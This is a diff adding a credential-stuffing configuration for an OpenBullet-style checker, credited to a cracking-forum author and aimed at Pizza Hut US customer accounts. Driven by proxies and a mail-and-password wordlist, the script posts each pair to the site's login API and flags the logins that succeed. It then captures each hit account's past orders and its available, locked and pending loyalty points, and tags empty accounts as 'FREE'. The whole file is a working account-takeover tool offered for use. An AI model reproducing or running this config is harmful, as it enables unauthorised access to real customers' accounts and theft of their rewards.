@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "PizzaHut US",
+  "SuggestedBots": 50,
+  "LastModified": "2019-04-04T08:57:03.6929496-04:00",
+  "AdditionalInfo": "Orders | Available Points | Locked Points | Pending Points",
+  "Author": "HazeChk - Nulled.to",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION GetRandomUA -> VAR "useragent" 
+REQUEST POST "https://www.pizzahut.com/init.php" 
+  CONTENT "{\"app\":0}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: <useragent>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.pizzahut.com" 
+  HEADER "Referer: https://www.pizzahut.com/index.php" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: es-ES,es;q=0.9,en;q=0.8" 
+REQUEST POST "https://www.pizzahut.com/api.php/site/api_ajax/marketingoverlay/getmobileherosidekick" 
+  CONTENT "{\"display\":\"lg\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: <useragent>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.pizzahut.com" 
+  HEADER "Referer: https://www.pizzahut.com/index.php" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: es-ES,es;q=0.9,en;q=0.8" 
+REQUEST GET "https://www.pizzahut.com/api.php/site/api_pages/api_menu/getstoretiles" 
+  
+  HEADER "User-Agent: <useragent>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Referer: https://www.pizzahut.com/index.php" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: es-ES,es;q=0.9,en;q=0.8" 
+REQUEST POST "https://www.pizzahut.com/api.php/site/api_ajax/login/do_login" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\",\"remember\":false,\"recaptcha2\":\"\",\"loyalty\":\"\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: <useragent>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Origin: https://www.pizzahut.com" 
+  HEADER "Referer: https://www.pizzahut.com/index.php" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: es-ES,es;q=0.9,en;q=0.8" 
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The email \/ password you entered is incorrect." 
+  KEYCHAIN Success OR 
+    KEY "\"status\":\"signed in\"" 
+PARSE "<SOURCE>" LR "\"past_orders\":" ",\"response\"" -> CAP "Orders" 
+PARSE "<SOURCE>" LR "\"available_pts\":" ",\"locked_pts\"" -> CAP "Available Points" 
+PARSE "<SOURCE>" LR "\"locked_pts\":" ",\"pending_pts\"" -> CAP "Locked Points" 
+PARSE "<SOURCE>" LR "\"pending_pts\":" ",\"rewards_available\"" -> CAP "Pending Points" 
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "{\"available_pts\":0" 
